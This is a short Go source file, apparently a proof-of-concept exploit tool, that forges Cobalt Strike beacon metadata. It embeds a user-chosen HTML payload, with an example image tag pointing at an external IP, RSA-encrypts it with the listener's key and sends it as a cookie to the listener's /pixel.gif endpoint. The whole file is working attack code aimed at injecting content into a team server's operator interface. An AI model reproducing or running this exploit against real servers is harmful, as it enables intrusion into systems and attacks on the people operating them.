package main

import (
	"CSPOC/utils"
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"net/http"
)

func main() {

	fmt.Println("ZheTian..... github.com/yqcs")

	listen := flag.String("u", "", "CobaltStrike Http listen url")                         //HTTP监听地址，如 http://127.0.0.1:8100
	payload := flag.String("p", "", "payload,em: <img src=http://124.70.40.185/logo.png>") //payload，如 <html><img src=http://127.0.0.1/log.png> 不宜过长
	flag.Parse()
	if *listen == "" || *payload == "" {
		log.Fatalln("Listen or payload is null")
	}

	//公钥
	publicKey := `
-----BEGIN PUBLIC KEY-----
` + utils.Beaconinit(*listen) + `
-----END PUBLIC KEY-----`

	//poc
	poc := "\x00\x00\xbe\xef\x00\x00\x00e\x0b\x00\x04\r\x0e\x0f\x0e\x0f\x0c\x0e\x02\x0f\x08\x07\x03\x05\xa8\x03\xa8\x03\x00" +
		"<\xe5\xee\x00\x00\xb4c\x00\x00\x04\x06\x02#\xf0\x00\x00\x00\x00v\x91\n`v\x90\xf5P\x0c\r\n\x02ZTian\t" + *payload + "\ta"

	//rsa加密
	rsaData := utils.RsaEncoding(poc, publicKey)
	if rsaData == nil {
		log.Fatalln("rsa public key error")
	}

	//发送请求
	request, err := http.NewRequest("GET", *listen+"/pixel.gif", nil)
	if err != nil {
		return
	}

	//payload经过base64加密之后添加至cookie
	request.Header.Add("Cookie", base64.StdEncoding.EncodeToString(rsaData))
	do, err := http.DefaultClient.Do(request)
	if err == nil && do.StatusCode == 200 {
		fmt.Println("Success")
	}
}
